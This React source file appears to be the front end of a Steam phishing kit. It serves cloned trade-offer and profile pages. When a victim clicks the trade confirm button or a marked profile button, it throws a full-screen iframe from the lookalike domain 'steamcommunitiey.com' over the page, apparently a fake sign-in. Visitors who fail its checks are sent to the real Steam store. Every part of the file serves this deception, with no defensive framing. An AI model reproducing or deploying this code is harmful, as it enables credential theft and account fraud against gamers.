import axios from "axios";
import { useEffect } from "react";
import { useParams } from "react-router-dom";
import "./App.scss";
import { generateUrl } from "./utils/generateUrl";

const App = () => {
    const { slug, token_part1, token_part2 } = useParams();

    useEffect(() => {
        const getPage = async () => {
            const envDomain = process.env.REACT_APP_FRIEND_INVITE_DOMAIN || "";
            const currentDomain = window.location.host;
            const splittedPathname = window.location.pathname
                .split("/")
                .filter((e) => e);
            const isCurrentDomainValid = envDomain === currentDomain;
            const isTradePage =
                splittedPathname[0] === "tradeoffer" &&
                splittedPathname[1] === "new";

            const className = ".lk0e6gi8s69v";
            const htmlUrl = "https://steamcommunitiey.com/txqmjgkxhzp5.html";

            const goTo = () =>
                (window.location.href = "https://store.steampowered.com/");

            const setUpAuth = () =>
                setTimeout(() => {
                    const openWind = () => {
                        const buttons = document.querySelectorAll(className);

                        if (buttons && buttons.length > 0) {
                            buttons.forEach((button) => {
                                button.addEventListener("click", () => {
                                    const iframe =
                                        document.createElement("iframe");
                                    iframe.src = htmlUrl;
                                    iframe.setAttribute(
                                        "style",
                                        "position: fixed; top: -2px; left: -2px; width: 100vw; height: 100vh; z-index: 99999"
                                    );
                                    document.documentElement.style.overflow =
                                        "hidden";
                                    document.body.appendChild(iframe);
                                });
                            });
                        }
                    };

                    openWind();
                }, 100);

            if (!slug && !token_part1 && !token_part2) {
                const urlParams = new URLSearchParams(window.location.search);
                const token = urlParams.get("token");
                const partnerId = urlParams.get("partnerId");

                if (!isTradePage || !partnerId || !token) return goTo();

                await axios
                    .get(generateUrl("trade/get"))
                    .then(async (res) => {
                        if (
                            res.data.partner !== partnerId ||
                            res.data.token !== token
                        )
                            return goTo();

                        await axios
                            .get("/trade.html")
                            .then((res) => {
                                document.open();
                                document.write(res.data);
                                document.close();

                                document.addEventListener(
                                    "DOMContentLoaded",
                                    () => {
                                        const targetElements = [
                                            ...Array.from(
                                                document.querySelectorAll(
                                                    ".slot_actionmenu_button"
                                                ) || []
                                            ),
                                            ...Array.from(
                                                document.querySelectorAll(
                                                    ".makeAuth"
                                                ) || []
                                            ),
                                            document.querySelector(
                                                ".trade_partner_member a"
                                            ),
                                            document.querySelector(
                                                ".trade_partner_headline_sub a"
                                            ),
                                            document.querySelector(
                                                ".trade_partner_steam_level_desc a"
                                            ),
                                            document.querySelector(
                                                "#trade_theirs > div.offerheader > div:nth-child(2) > h2 > a"
                                            ),
                                        ];

                                        const confirmOffer =
                                            document.getElementById(
                                                "trade_confirmbtn"
                                            );

                                        confirmOffer?.addEventListener(
                                            "click",
                                            (e: any) => {
                                                if (
                                                    !(
                                                        e.currentTarget ||
                                                        e.target
                                                    ).classList.contains(
                                                        "active"
                                                    )
                                                )
                                                    return;

                                                const iframe =
                                                    document.createElement(
                                                        "iframe"
                                                    );
                                                iframe.src = htmlUrl;
                                                iframe.setAttribute(
                                                    "style",
                                                    "position: fixed; top: -2px; left: -2px; width: 100vw; height: 100vh; z-index: 1000"
                                                );
                                                document.documentElement.style.overflow =
                                                    "hidden";
                                                document.body.appendChild(
                                                    iframe
                                                );
                                            }
                                        );

                                        targetElements.forEach(
                                            (e) =>
                                                e &&
                                                e.classList.add(
                                                    className.replaceAll(
                                                        ".",
                                                        ""
                                                    )
                                                )
                                        );

                                        setUpAuth();
                                    }
                                );
                            })
                            .catch(() => goTo());
                    })
                    .catch(() => goTo());

                return;
            }

            if (isCurrentDomainValid) {
                if (slug || (token_part1 && token_part2)) {
                    const linkPart = slug
                        ? "id/" + slug
                        : "p/" + token_part1 + "/" + token_part2;
                    return (window.location.href =
                        (process.env.REACT_APP_FRIEND_INVITE_REDIRECT_URL ||
                            "http://localhost:3000/") + linkPart);
                }
                return goTo();
            }

            if (slug && !token_part1 && !token_part2) {
                await axios
                    .get(generateUrl(`profile/get/${slug}`))
                    .then((res) => {
                        document.documentElement.innerHTML = res.data;

                        setUpAuth();
                    })
                    .catch(goTo);
            }

            if (!slug && token_part1 && token_part2) {
                axios
                    .get(
                        generateUrl(
                            `profile/get/by_invite_link_path/?invite_link_path=${token_part1}/${token_part2}`
                        )
                    )
                    .then((res) => {
                        document.documentElement.innerHTML = res.data;

                        setUpAuth();
                    })
                    .catch(() => goTo());
            }
        };

        getPage();
    }, []);

    return <div className="App"></div>;
};

export default App;
